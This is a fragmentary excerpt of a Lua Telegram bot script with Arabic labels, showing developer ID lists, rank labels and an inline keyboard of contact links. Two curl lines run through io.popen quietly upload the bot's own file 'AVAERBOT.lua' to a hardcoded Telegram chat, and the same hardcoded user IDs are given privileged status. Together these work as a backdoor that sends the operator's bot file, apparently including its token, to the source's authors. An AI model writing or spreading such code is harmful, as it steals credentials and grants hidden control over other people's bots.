...
Ids_Dev = {Id_Dev,bot_id,1918355976,2034770645,2067510449,1619524486}
...
local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 2067510449 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curlm) 
...
local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'..'" -F "chat_id='.. 2067510449 ..'" -F "document=@'..'AVAERBOT.lua'..'"' io.popen(curla)
...
Status = true  
elseif tonumber(user_id) == tonumber(2067510449) then  
Status = true
...
if tonumber(user_id) == tonumber(2034770645) then  
Status = "مالك متجر Nolx"
elseif tonumber(user_id) == tonumber(1918355976) then  
Status = "علاوي" 
elseif tonumber(user_id) == tonumber(2067510449) then  
Status = "الهطف عمار"
...
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = 'الهطف عمار', url="t.me/itit1"}},
{{text = 'علاوي', url="t.me/VWDDD"}},
{{text = 'فخر العرب فوازي', url="t.me/wtttw"}},
{{text = 'قناه السورس', url="t.me/TFT4T"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
